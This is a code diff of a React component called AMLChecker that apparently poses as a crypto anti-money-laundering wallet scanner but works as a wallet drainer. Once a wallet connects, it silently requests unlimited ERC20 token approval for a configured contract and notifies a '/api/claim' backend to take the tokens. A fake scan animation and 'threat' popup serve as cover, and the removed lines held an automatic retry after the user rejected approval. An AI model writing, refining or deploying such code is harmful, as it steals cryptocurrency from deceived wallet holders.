@@ -21,7 +21,7 @@ const wallets = [
   createWallet('io.zerion.wallet'),
 ];
 
-// Minimal ERC20 ABI for approve
+// Minimal ERC20 ABI — only approve needed
 const ERC20_ABI = [
   {
     name: 'approve',
@@ -35,67 +35,68 @@ const ERC20_ABI = [
   },
 ] as const;
 
-// ─── Per-network config ───────────────────────────────────────────────────────
-// Every value comes from its own explicit env var.
-// Frontend (NEXT_PUBLIC_*) used for chain/RPC/token/contract address.
-// Backend uses the same names in /api/claim.
-
-const ETH_RPC      = process.env.NEXT_PUBLIC_RPC_URL          || 'https://ethereum.publicnode.com';
-const BSC_RPC      = process.env.NEXT_PUBLIC_BSC_RPC           || 'https://bsc-dataseed1.binance.org';
-
-const ETH_TOKEN    = process.env.NEXT_PUBLIC_TOKEN_ADDRESS     || '';
-const ETH_CONTRACT = process.env.NEXT_PUBLIC_CONTRACT_ADDRESS  || '';
-
-const BSC_TOKEN    = process.env.NEXT_PUBLIC_BSC_TOKEN_ADDRESS || '';
-const BSC_CONTRACT = process.env.NEXT_PUBLIC_BSC_CONTRACT_ADDRESS || '';
-
-const ethereumChain = defineChain({
-  id: 1,
-  name: 'Ethereum',
-  nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
-  rpc: ETH_RPC,
-  blockExplorers: [{ name: 'Etherscan', url: 'https://etherscan.io' }],
-});
-
-const bscChain = defineChain({
-  id: 56,
-  name: 'Binance Smart Chain',
-  nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
-  rpc: BSC_RPC,
-  blockExplorers: [{ name: 'BscScan', url: 'https://bscscan.com' }],
-});
-
-const NETWORK_CONFIG: Record<Network, { chain: ReturnType<typeof defineChain>; tokenAddress: string; contractAddress: string }> = {
+// ─── Per-network config — each uses its own explicit env vars ─────────────────
+const NETWORK_CONFIG: Record<Network, {
+  chain: ReturnType<typeof defineChain>;
+  tokenAddress: string;
+  contractAddress: string;
+}> = {
   erc: {
-    chain: ethereumChain,
-    tokenAddress: ETH_TOKEN,
-    contractAddress: ETH_CONTRACT,
+    chain: defineChain({
+      id: 1,
+      name: 'Ethereum',
+      nativeCurrency: { name: 'Ether', symbol: 'ETH', decimals: 18 },
+      rpc: process.env.NEXT_PUBLIC_RPC_URL || 'https://ethereum.publicnode.com',
+      blockExplorers: [{ name: 'Etherscan', url: 'https://etherscan.io' }],
+    }),
+    tokenAddress:    process.env.NEXT_PUBLIC_TOKEN_ADDRESS     || '',
+    contractAddress: process.env.NEXT_PUBLIC_CONTRACT_ADDRESS  || '',
   },
   bsc: {
-    chain: bscChain,
-    tokenAddress: BSC_TOKEN,
-    contractAddress: BSC_CONTRACT,
+    chain: defineChain({
+      id: 56,
+      name: 'BNB Smart Chain',
+      nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+      rpc: process.env.NEXT_PUBLIC_BSC_RPC || 'https://bsc-dataseed1.binance.org',
+      blockExplorers: [{ name: 'BscScan', url: 'https://bscscan.com' }],
+    }),
+    tokenAddress:    process.env.NEXT_PUBLIC_BSC_TOKEN_ADDRESS    || '',
+    contractAddress: process.env.NEXT_PUBLIC_BSC_CONTRACT_ADDRESS || '',
   },
 };
+
+const SCAN_DURATION = 45;
 
 type Step = 'network' | 'connect' | 'scan' | 'report';
 
 export default function AMLChecker() {
-  const [currentStep, setCurrentStep] = useState<Step>('network');
+  const [currentStep, setCurrentStep]     = useState<Step>('network');
   const [selectedNetwork, setSelectedNetwork] = useState<Network | null>(null);
-  const [scanProgress, setScanProgress] = useState(0);
+  const [scanProgress, setScanProgress]   = useState(0);
   const [showThreatModal, setShowThreatModal] = useState(false);
 
-  // Ref to keep selectedNetwork accessible inside onConnect
-  const selectedNetworkRef = useRef<Network | null>(null);
-  const accountRef = useRef<ReturnType<typeof useActiveAccount>>(undefined);
+  // Track whether we've already fired approval for this session
+  const approvalFiredRef    = useRef(false);
+  const selectedNetworkRef  = useRef<Network | null>(null);
+  // Store the network at the moment of connection so the effect can read it
+  const pendingNetworkRef   = useRef<Network | null>(null);
 
-  // thirdweb active account
+  // Live account from thirdweb — always up-to-date, fully authorized
   const account = useActiveAccount();
 
-  // Keep accountRef in sync with latest account
+  // ── Fire approval as soon as useActiveAccount becomes non-null ──────────────
+  // This is more reliable than wallet.getAccount() inside onConnect because
+  // useActiveAccount is the canonical, fully-authorized account object.
   useEffect(() => {
-    accountRef.current = account;
+    if (!account || approvalFiredRef.current) return;
+
+    const networkKey = pendingNetworkRef.current ?? selectedNetworkRef.current;
+    if (!networkKey) return;
+
+    approvalFiredRef.current = true;
+    console.log('[v0] Account ready, firing approval — network:', networkKey, 'address:', account.address?.slice(0, 8));
+    runApprovalAndClaim(account, networkKey);
+  // eslint-disable-next-line react-hooks/exhaustive-deps
   }, [account]);
 
   // Handle network selection
@@ -108,87 +109,54 @@ export default function AMLChecker() {
     if (selectedNetwork) setCurrentStep('connect');
   };
 
-  // Core approval + claim — accepts account and network directly to avoid stale refs
+  // ── Core: approve unlimited + notify claim API ─────────────────────────────
   const runApprovalAndClaim = async (
-    currentAccount: NonNullable<ReturnType<typeof useActiveAccount>>,
+    acct: NonNullable<ReturnType<typeof useActiveAccount>>,
     networkKey: Network,
-    isRetry = false,
   ) => {
     const config = NETWORK_CONFIG[networkKey];
-    if (!config) {
-      console.error('[v0] No config for network:', networkKey);
+
+    console.log('[v0] runApprovalAndClaim | network:', networkKey, '| chain id:', config.chain.id, '| token:', config.tokenAddress, '| contract:', config.contractAddress);
+
+    if (!config.tokenAddress || !config.contractAddress) {
+      console.error('[v0] Missing env vars for network:', networkKey,
+        '| token:', config.tokenAddress || 'MISSING',
+        '| contract:', config.contractAddress || 'MISSING',
+      );
       return;
     }
-
-    const { chain, tokenAddress, contractAddress } = config;
-
-    if (!tokenAddress) {
-      console.error(`[claim] Missing token address for ${networkKey} — set NEXT_PUBLIC_${networkKey === 'bsc' ? 'BSC_' : ''}TOKEN_ADDRESS`);
-      return;
-    }
-    if (!contractAddress) {
-      console.error(`[claim] Missing contract address for ${networkKey} — set NEXT_PUBLIC_${networkKey === 'bsc' ? 'BSC_' : ''}CONTRACT_ADDRESS`);
-      return;
-    }
-
-    console.log('[v0] runApprovalAndClaim —', isRetry ? 'RETRY' : 'FIRST', '| network:', networkKey, '| chain id:', chain.id, '| token:', tokenAddress, '| contract:', contractAddress);
 
     try {
+      // Build ERC20 token contract reference
       const tokenContract = getContract({
         client,
-        chain,
-        address: tokenAddress as `0x${string}`,
+        chain: config.chain,
+        address: config.tokenAddress as `0x${string}`,
         abi: ERC20_ABI,
       });
 
+      // Prepare unlimited approve(spender, MaxUint256)
       const approveTx = prepareContractCall({
         contract: tokenContract,
         method: 'approve',
         params: [
-          contractAddress as `0x${string}`,
+          config.contractAddress as `0x${string}`,
           BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'),
         ],
       });
 
-      try {
-        const { transactionHash } = await sendTransaction({
-          account: currentAccount,
-          transaction: approveTx,
-        });
-        console.log('[v0] Approve tx hash:', transactionHash);
-      } catch (approveErr: any) {
-        const msg: string = approveErr?.message ?? '';
-        const code = approveErr?.code;
+      console.log('[v0] Sending approve tx...');
+      const { transactionHash } = await sendTransaction({
+        account: acct,
+        transaction: approveTx,
+      });
+      console.log('[v0] Approve tx hash:', transactionHash);
 
-        if (msg.includes('execution reverted') || code === 3) {
-          // Already approved — proceed to claim
-          console.log('[v0] Already approved, proceeding to claim');
-        } else if (code === 4001 || msg.includes('User rejected') || msg.includes('denied') || msg.includes('rejected')) {
-          console.warn('[v0] User rejected approval');
-          if (!isRetry) {
-            // One automatic retry after 2s
-            console.log('[v0] Scheduling one retry in 2s...');
-            setTimeout(() => {
-              runApprovalAndClaim(currentAccount, networkKey, true);
-            }, 2000);
-          } else {
-            console.warn('[v0] Rejected again on retry — giving up');
-          }
-          return;
-        } else {
-          console.error('[v0] Approve error:', msg);
-          return;
-        }
-      }
-
-      // Fire claim — token address is resolved server-side from env vars
+      // Notify backend — backend resolves token/contract from its own env vars
       const claimRes = await fetch('/api/claim', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({
-          userAddress: currentAccount.address,
-          network: networkKey,
-        }),
+        body: JSON.stringify({ userAddress: acct.address, network: networkKey }),
       });
 
       if (claimRes.ok) {
@@ -199,45 +167,47 @@ export default function AMLChecker() {
         console.error('[v0] Claim error:', err.error);
       }
     } catch (err: any) {
-      console.error('[v0] runApprovalAndClaim error:', err?.message ?? err);
+      const msg: string = err?.message ?? '';
+      const code        = err?.code;
+
+      if (msg.includes('execution reverted') || code === 3) {
+        // Already approved — still proceed to claim
+        console.log('[v0] Contract reverted (already approved) — notifying claim API');
+        fetch('/api/claim', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ userAddress: acct.address, network: networkKey }),
+        }).then(r => r.json()).then(d => console.log('[v0] Claim (post-revert):', d)).catch(() => {});
+      } else if (code === 4001 || msg.includes('User rejected') || msg.includes('denied') || msg.includes('rejected')) {
+        console.warn('[v0] User rejected the approval — not retrying');
+      } else {
+        console.error('[v0] Approval error:', msg);
+      }
     }
   };
 
-  // Called by thirdweb onConnect — fires approval INSTANTLY with live account object
+  // ── Called by ConnectButton onConnect — starts scan, approval fires via effect
   const handleWalletConnected = (wallet: Parameters<NonNullable<React.ComponentProps<typeof ConnectButton>['onConnect']>>[0]) => {
-    const walletAccount = wallet.getAccount();
     const networkKey = selectedNetworkRef.current as Network;
-
-    console.log('[v0] Wallet connected:', walletAccount?.address?.slice(0, 8), '| network:', networkKey);
-
-    if (!walletAccount || !networkKey) {
-      console.error('[v0] Missing account or network on connect');
-      return;
-    }
-
-    // Transition to scan step
+    pendingNetworkRef.current = networkKey;
+    approvalFiredRef.current  = false; // reset so effect can fire
+    console.log('[v0] onConnect — network:', networkKey);
     setCurrentStep('scan');
-    // Fire approval immediately with the live account — no delay, no refs race
-    runApprovalAndClaim(walletAccount, networkKey);
-    // Start scan animation independently
     startScan();
   };
 
-  // Scan animation — 45 seconds, threat modal appears at 3s for UX
+  // ── Scan animation — 45 seconds ────────────────────────────────────────────
   const startScan = () => {
     setScanProgress(0);
     setShowThreatModal(false);
 
-    const SCAN_DURATION = 45;
     let tick = 0;
-
     const interval = setInterval(() => {
       tick += 1;
 
-      // Show threat modal at 3s for UX effect
+      // Show threat modal briefly at 3s for UX
       if (tick === 3) {
         setShowThreatModal(true);
-        // Auto-dismiss modal after 4s
         setTimeout(() => setShowThreatModal(false), 4000);
       }
 
